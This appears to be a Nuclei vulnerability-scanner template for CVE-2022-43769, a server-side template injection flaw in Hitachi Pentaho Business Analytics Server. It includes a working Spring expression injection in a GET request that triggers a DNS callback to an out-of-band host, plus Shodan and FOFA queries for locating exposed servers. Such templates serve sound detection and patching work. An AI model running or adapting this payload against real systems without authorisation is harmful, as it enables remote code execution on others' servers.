http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - 'false'
  - part: header
    type: word
    words:
    - application/json
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.net.InetAddress).getByName(''{{interactsh-url}}'')}&mgrDn=a&pwd=a'
id: CVE-2022-43769
info:
  author: dwbzn
  classification:
    cpe: cpe:2.3:a:hitachi:vantara_pentaho_business_analytics_server:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-43769
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cwe-id: CWE-94,CWE-74
    epss-percentile: 0.99877
    epss-score: 0.93976
  description: 'Hitachi Pentaho Business Analytics Server prior to versions 9.4.0.1
    and 9.3.0.2, including 8.3.x, is susceptible to remote code execution via server-side
    template injection. Certain web services can set property values which contain
    Spring templates that are interpreted downstream, thereby potentially enabling
    an attacker to execute malware, obtain sensitive information, modify data, and/or
    perform unauthorized operations without entering necessary credentials.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected server.

    '
  metadata:
    fofa-query: icon_hash=1749354953
    max-request: 1
    product: vantara_pentaho_business_analytics_server
    shodan-query: http.favicon.hash:1749354953
    vendor: hitachi
    verified: true
  name: Hitachi Pentaho Business Analytics Server - Remote Code Execution
  reference:
  - https://support.pentaho.com/hc/en-us/articles/14455561548301--Resolved-Pentaho-BA-Server-Failure-to-Sanitize-Special-Elements-into-a-Different-Plane-Special-Element-Injection-Versions-before-9-4-0-1-and-9-3-0-2-including-8-3-x-Impacted-CVE-2022-43769-
  - https://nvd.nist.gov/vuln/detail/CVE-2022-43769
  - http://packetstormsecurity.com/files/172296/Pentaho-Business-Server-Authentication-Bypass-SSTI-Code-Execution.html
  remediation: Upgrade to 9.4 with Service Pack 9.4.0.1. For version 9.3, recommend
    updating to Service Pack 9.3.0.2.
  severity: high
  tags: cve,cve2022,packetstorm,rce,ssti,pentaho,hitachi,kev,vkev,vuln
